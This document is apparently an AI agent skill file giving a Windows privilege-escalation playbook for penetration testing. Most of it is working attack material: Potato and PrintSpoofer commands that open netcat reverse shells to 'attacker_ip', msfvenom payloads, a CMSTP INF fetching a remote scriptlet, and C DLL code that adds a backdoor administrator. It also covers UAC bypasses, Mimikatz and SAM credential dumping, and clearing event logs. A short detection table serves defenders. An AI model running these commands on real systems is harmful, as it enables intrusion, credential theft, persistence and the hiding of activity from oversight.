---
name: offensive-windows-privesc
description: "Comprehensive Windows privilege escalation methodology for offensive security engagements. Covers the full attack surface from a standard user shell to NT AUTHORITY\\SYSTEM: token impersonation via SeImpersonate and SeAssignPrimaryToken privileges using JuicyPotato, PrintSpoofer, GodPotato, SweetPotato, and RoguePotato; service misconfigurations including unquoted service paths, weak service DACLs, writable service binaries, and insecure service creation permissions; AlwaysInstallElevated MSI exploitation; DLL hijacking through search order abuse, phantom DLL loading, and writable PATH directory injection; UAC bypass techniques via fodhelper.exe, eventvwr.exe, CMSTP, and environment variable manipulation; scheduled task abuse for writable task actions and new task creation; registry autorun exploitation for persistence and escalation; PrintNightmare (CVE-2021-34527) for remote and local privilege escalation; and credential harvesting from SAM database extraction, DPAPI blob decryption, LSA secret dumping, and Credential Manager enumeration. Integrates automated enumeration with WinPEAS, PowerUp, SharpUp, Seatbelt, and BeRoot. Each technique includes detection signatures and defender-side visibility for purple team operations. Maps to MITRE ATT&CK T1548 (Abuse Elevation Control Mechanism) and T1574 (Hijack Execution Flow). Designed for authorized penetration testing, red team engagements, and CTF competitions where you hold a standard user shell and need to escalate to SYSTEM or local Administrator."
---

# Windows Privilege Escalation

You have a standard user shell on a Windows target. Your objective is to escalate to NT AUTHORITY\SYSTEM or local Administrator through systematic enumeration and exploitation of misconfigurations, vulnerable services, and unpatched software. This skill provides a structured methodology that moves from passive reconnaissance through increasingly aggressive techniques.

Windows privilege escalation differs fundamentally from Linux. The attack surface centers on services, tokens, the registry, DLL loading mechanics, and the Windows access control model. Master these primitives and you can chain findings from any enumeration tool into a working escalation path.

## Quick Workflow

1. Run automated enumeration (WinPEAS, PowerUp, Seatbelt) to surface misconfigurations.
2. Check current privileges -- SeImpersonate/SeAssignPrimaryToken are immediate wins.
3. Enumerate services for unquoted paths, weak DACLs, and writable binaries.
4. Check AlwaysInstallElevated registry keys for MSI-based escalation.
5. Identify DLL hijacking opportunities in privileged processes.
6. Attempt UAC bypass if running as a local admin without elevated context.
7. Inspect scheduled tasks, registry autoruns, and writable PATH directories.
8. Harvest credentials from SAM, DPAPI, LSA secrets, and Credential Manager.
9. Check for PrintNightmare and other unpatched vulnerabilities as a last resort.

---

## Automated Enumeration

Run automated tools first to build a comprehensive picture of the attack surface. Review output methodically -- these tools surface findings you would otherwise miss.

```powershell
# WinPEAS
.\winPEASx64.exe > C:\Users\Public\winpeas.txt 2>&1
.\winPEASx64.exe servicesinfo  # Specific checks only

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -FilePath C:\Users\Public\powerup.txt

# SharpUp / Seatbelt / BeRoot
.\SharpUp.exe audit
.\Seatbelt.exe -group=all > C:\Users\Public\seatbelt.txt
.\beRoot.exe
```

---

## Token Impersonation

When your user holds SeImpersonate or SeAssignPrimaryToken privileges (common for service accounts, IIS AppPool, SQL Server, MSSQL), you can impersonate the SYSTEM token. This is one of the most reliable escalation vectors on Windows.

### Privilege Check

```powershell
# Check current privileges
whoami /priv

# Look for these specifically:
# SeImpersonatePrivilege        - Impersonate a client after authentication
# SeAssignPrimaryTokenPrivilege - Replace a process-level token
```

### JuicyPotato (Windows Server 2008-2016, Windows 7-10 before 1809)

```powershell
# JuicyPotato abuses COM DCOM authentication to negotiate a SYSTEM token
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

# Common CLSIDs vary by OS version
# Windows 10: {4991d34b-80a1-4291-83b6-3328366b9097}
# Windows Server 2016: {8BC3F05E-D86B-11D0-A075-00C04FB68820}

# If default CLSID fails, enumerate valid ones
.\JuicyPotato.exe -z -l 1337 -t * -c {clsid_here}
```

### PrintSpoofer (Windows 10, Server 2016/2019)

```powershell
# Abuses the Print Spooler service to capture a SYSTEM token
.\PrintSpoofer64.exe -i -c powershell.exe

# Direct command execution
.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe"
```

### GodPotato (Windows 8-11, Server 2012-2022)

```powershell
# Works across a wide range of Windows versions -- choose the right .NET binary
.\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe"
```

### SweetPotato and RoguePotato

```powershell
# SweetPotato -- combines multiple potato techniques
.\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123! /add && net localgroup Administrators hacker /add"

# RoguePotato (Win10 1809+, Server 2019) -- requires attacker relay on port 135
# Attacker: socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999
.\RoguePotato.exe -r attacker_ip -e "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```

Choose your potato based on the target OS version. PrintSpoofer and GodPotato have the broadest coverage on modern systems.

---

## Service Misconfigurations

Windows services running as SYSTEM are a primary escalation target. Misconfigurations in service paths, permissions, and binary locations create exploitable conditions.

### Unquoted Service Paths

```powershell
# Find unquoted service paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '"'

# Or use PowerUp
Get-ServiceUnquoted

# Example: path is C:\Program Files\Some Service\binary.exe
# Windows tries these in order:
#   C:\Program.exe
#   C:\Program Files\Some.exe
#   C:\Program Files\Some Service\binary.exe

# If you can write to C:\Program Files\Some Service\
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o "C:\Program Files\Some Service\Some.exe"

# Restart the service
sc stop "ServiceName"
sc start "ServiceName"
# Or wait for system reboot
```

### Weak Service DACLs

```powershell
# Check service permissions with accesschk (Sysinternals)
.\accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
.\accesschk64.exe -uwcqv "Users" * /accepteula
.\accesschk64.exe -uwcqv "Everyone" * /accepteula

# If SERVICE_CHANGE_CONFIG is granted
sc config "VulnService" binpath= "C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe"
sc stop "VulnService"
sc start "VulnService"

# If SERVICE_ALL_ACCESS is granted
sc config "VulnService" binpath= "net localgroup administrators hacker /add"
sc stop "VulnService"
sc start "VulnService"

# PowerUp automated exploitation
Invoke-ServiceAbuse -Name 'VulnService' -UserName 'hacker' -Password 'Password123!'
```

### Writable Service Binaries

```powershell
# Check if the service binary is writable, then replace it
icacls "C:\Program Files\Service\binary.exe"
move "C:\Program Files\Service\binary.exe" "C:\Program Files\Service\binary.exe.bak"
copy C:\Users\Public\payload.exe "C:\Program Files\Service\binary.exe"
sc stop "ServiceName" && sc start "ServiceName"

# Using PowerUp
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'VulnService'
```

---

## AlwaysInstallElevated

When both the machine and user AlwaysInstallElevated registry keys are set to 1, any user can install MSI packages with SYSTEM privileges.

```powershell
# Check both registry keys (both must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate a malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o escalate.msi

# Install with elevated privileges
msiexec /quiet /qn /i C:\Users\Public\escalate.msi

# Using PowerUp
Write-UserAddMSI
# Creates UserAdd.msi that adds a local admin
msiexec /quiet /qn /i UserAdd.msi
```

---

## DLL Hijacking

Windows DLL search order creates opportunities to inject malicious libraries into privileged process contexts. When a process running as SYSTEM loads a DLL from a writable location, you can substitute your own.

### Search Order Hijacking

```powershell
# Standard DLL search order:
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory
# 5. Current directory
# 6. PATH directories

# Monitor DLL loading with Process Monitor (procmon)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Find writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl) {
        $_ + " -> " + ($acl.Access | Where-Object {
            $_.IdentityReference -match "Users|Everyone|Authenticated" -and
            $_.FileSystemRights -match "Write|Modify|FullControl"
        } | Select-Object -First 1).IdentityReference
    }
}
```

### Phantom DLL Hijacking

```powershell
# Some services load DLLs that do not exist -- use procmon to identify these.
# Common phantom DLLs: wlbsctrl.dll (IKEEXT), wbemcomn.dll (WMI), fveapi.dll
# Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f dll -o wlbsctrl.dll
copy wlbsctrl.dll C:\writable\path\directory\
```

### Malicious DLL Template

```c
// dll_hijack.c -- compile with: x86_64-w64-mingw32-gcc -shared -o hijack.dll dll_hijack.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, "cmd.exe /c net localgroup administrators hacker /add",
                      NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    return TRUE;
}
```

---

## UAC Bypass

User Account Control can be bypassed when you are running as a local administrator in a medium-integrity context. UAC bypass elevates to high integrity without a consent prompt.

### Check UAC Settings

```powershell
# Check current integrity level
whoami /groups | findstr "Mandatory"

# Check UAC configuration
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin = 0 means UAC is effectively disabled
```

### fodhelper.exe Bypass

```powershell
# fodhelper.exe auto-elevates and reads from a user-writable registry key
# Works on Windows 10/11

# Set the registry key to execute our command
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\Public\nc.exe attacker_ip 4444 -e cmd.exe" -Force

# Trigger fodhelper
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### eventvwr.exe Bypass

```powershell
# eventvwr.exe reads from HKCU registry before HKCR
# Works on Windows 7-10

New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\Public\payload.exe" -Force

# Trigger eventvwr
Start-Process "C:\Windows\System32\eventvwr.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

### CMSTP Bypass

```powershell
# Create an INF file that CMSTP will process
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://attacker_ip/payload.sct
"@
$inf | Out-File C:\Users\Public\bypass.inf

# Execute CMSTP with the crafted INF
cmstp.exe /ni /s C:\Users\Public\bypass.inf
```

---

## Scheduled Task Abuse

Scheduled tasks running as SYSTEM with writable actions or misconfigured permissions provide escalation paths.

```powershell
# Enumerate scheduled tasks
schtasks /query /fo LIST /v > C:\Users\Public\tasks.txt

# Find tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /i "SYSTEM" -B 5

# Check permissions on task action binaries
icacls "C:\Path\To\Task\Binary.exe"

# If the binary is writable
copy C:\Users\Public\payload.exe "C:\Path\To\Task\Binary.exe"

# Check task file permissions (XML definitions)
.\accesschk64.exe -uwq "C:\Windows\System32\Tasks" /accepteula

# Create a new scheduled task (requires appropriate permissions)
schtasks /create /tn "Escalate" /tr "C:\Users\Public\payload.exe" /sc onstart /ru SYSTEM

# Using PowerShell
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\nc.exe" -Argument "attacker_ip 4444 -e cmd.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "Escalate" -Action $action -Trigger $trigger -Principal $principal
```

---

## Registry Autoruns

Programs configured to run at startup via registry keys can be hijacked if their binaries or referenced paths are writable.

```powershell
# Common autorun registry locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on autorun binaries
.\accesschk64.exe -uwqs "Everyone" "C:\Program Files" /accepteula
.\accesschk64.exe -uwqs "Users" "C:\Program Files" /accepteula

# If an autorun binary is writable
move "C:\Program Files\Autorun\app.exe" "C:\Program Files\Autorun\app.exe.bak"
copy C:\Users\Public\payload.exe "C:\Program Files\Autorun\app.exe"

# Wait for admin login or system reboot

# Using PowerUp
Get-ModifiableRegistryAutoRun
```

---

## PrintNightmare -- CVE-2021-34527

PrintNightmare affects the Windows Print Spooler service and enables both remote code execution and local privilege escalation. It allows loading an arbitrary DLL as SYSTEM.

```powershell
# Check if Print Spooler is running
Get-Service -Name Spooler

# Check if the system is patched
Get-HotFix | Where-Object { $_.HotFixID -match "KB500(05010|05022|05040)" }

# Local privilege escalation variant
# Requires a malicious DLL accessible via UNC path or local path

# Using the PowerShell PoC
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare -DLL "C:\Users\Public\malicious.dll"

# Using SharpPrintNightmare
.\SharpPrintNightmare.exe "C:\Users\Public\malicious.dll"

# The DLL executes as SYSTEM when the Spooler processes the driver
# Common payload: add user to local admins
# DLL calls: net localgroup administrators hacker /add
```

```c
// printnightmare_dll.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("net user hacker Password123! /add");
        system("net localgroup administrators hacker /add");
    }
    return TRUE;
}
```

---

## Credential Harvesting

Credentials stored on the system can enable lateral movement or direct escalation to higher-privileged accounts.

### SAM Database Extraction

```powershell
# SAM and SYSTEM hive extraction (requires admin or backup operators group)
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
reg save HKLM\SECURITY C:\Users\Public\SECURITY

# Transfer to attacker machine and extract with secretsdump
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Volume Shadow Copy method (if reg save fails)
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\Public\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM
```

### DPAPI and LSA Secrets

```powershell
# DPAPI -- list credential blobs
dir C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# Mimikatz DPAPI decryption (requires SYSTEM or user context)
mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<blob>" exit

# SharpDPAPI for targeted extraction
.\SharpDPAPI.exe triage

# LSA secrets (service account passwords, auto-logon creds, machine account)
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
```

### Credential Manager

```powershell
# Enumerate stored credentials
cmdkey /list

# If credentials are stored for admin accounts, use runas
runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\Users\Public\whoami.txt"
```

### Additional Credential Sources

```powershell
# Unattended install files
dir C:\Unattend.xml C:\Windows\Panther\Unattend.xml C:\sysprep\sysprep.xml /s 2>nul

# IIS configuration and web.config
type C:\inetpub\wwwroot\web.config 2>nul

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear

# PowerShell history
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved RDP connections
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
```

---

## Detection / Defender View

Every technique above has corresponding detection opportunities. Understanding these helps you operate more carefully on mature targets and helps blue teams build monitoring.

| Technique | Detection Indicator |
|---|---|
| WinPEAS/enumeration | High volume of WMI queries, registry reads, service enumeration in rapid succession |
| Token impersonation | Named pipe creation (PrintSpoofer), COM/DCOM unusual activation (Potato family), Sysmon Event ID 8 (CreateRemoteThread) |
| Service abuse | Service configuration changes (Event ID 7045), sc.exe/reg.exe execution, binary replacement (file integrity) |
| AlwaysInstallElevated | msiexec.exe spawning unexpected child processes, MSI install events from non-admin users |
| DLL hijacking | DLL loads from unusual paths (Sysmon Event ID 7), unsigned DLLs in system directories |
| UAC bypass | Registry modifications under HKCU\Software\Classes, auto-elevating processes spawning cmd/powershell (Event ID 4688) |
| Scheduled task abuse | Task creation events (Event ID 4698), task modification (Event ID 4702), schtasks.exe execution |
| PrintNightmare | Print Spooler loading DLLs from non-standard paths, Event ID 808 (PrintService), driver installation events |
| Credential harvesting | LSASS access (Sysmon Event ID 10), reg.exe accessing SAM/SECURITY/SYSTEM hives, Mimikatz signatures |

Key log sources:

```text
Windows Security Log: 4688 (process creation), 4697 (service install), 4698 (task creation), 4703 (token adjust), 7045 (new service)
Sysmon: Event 1 (process), 7 (DLL load), 8 (CreateRemoteThread), 10 (LSASS access), 13 (registry set)
PowerShell: Script Block Logging (4104), Module Logging, Transcription
```

---

## Engagement Cheatsheet

```text
PHASE 1 -- ENUMERATE
  whoami /priv                                # SeImpersonate? SeAssignPrimaryToken?
  whoami /groups                              # Local admin? Backup operators?
  systeminfo                                  # OS version, hotfixes, architecture
  wmic service get name,pathname,startmode    # Unquoted paths
  reg query HKLM\...\AlwaysInstallElevated    # MSI escalation
  schtasks /query /fo LIST /v                 # Scheduled tasks
  reg query HKLM\...\Run                      # Autoruns

PHASE 2 -- QUICK WINS
  SeImpersonate -> PrintSpoofer / GodPotato   # Service account to SYSTEM
  AlwaysInstallElevated -> msiexec payload    # Any user to SYSTEM
  Writable service binary -> replace + restart

PHASE 3 -- SERVICE EXPLOITATION
  Unquoted path -> drop binary in gap
  Weak DACL -> sc config binpath
  DLL hijack -> writable PATH dir or phantom DLL

PHASE 4 -- UAC + CREDENTIALS
  fodhelper/eventvwr -> high integrity shell
  SAM + SYSTEM hive extraction -> offline crack
  Mimikatz -> DPAPI, LSA, credential manager
  cmdkey /list -> runas /savecred

PHASE 5 -- CVE EXPLOITATION (last resort)
  PrintNightmare -> CVE-2021-34527 (Spooler)
  Check systeminfo against exploit-db/windows-exploit-suggester

CLEANUP
  Remove dropped binaries and DLLs
  Restore original service configurations
  Remove created users and scheduled tasks
  Clear PowerShell history and event logs (if authorized)
  sc config "ServiceName" binpath= "original_path"
```

---

## Key References

- WinPEAS -- Windows Privilege Escalation Awesome Script: https://github.com/peass-ng/PEASS-ng
- PowerUp -- PowerShell privilege escalation tool: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- SharpUp -- C# port of PowerUp: https://github.com/GhostPack/SharpUp
- Seatbelt -- Host survey tool: https://github.com/GhostPack/Seatbelt
- BeRoot -- Windows privilege escalation checks: https://github.com/AlessandroZ/BeRoot
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- JuicyPotato: https://github.com/ohpe/juicypotato
- UACME -- UAC bypass methods: https://github.com/hfiref0x/UACME
- HackTricks Windows Privilege Escalation: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- CVE-2021-34527 (PrintNightmare): https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
- MITRE ATT&CK T1548 -- Abuse Elevation Control Mechanism: https://attack.mitre.org/techniques/T1548/
- MITRE ATT&CK T1574 -- Hijack Execution Flow: https://attack.mitre.org/techniques/T1574/
- PayloadsAllTheThings Windows Privesc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
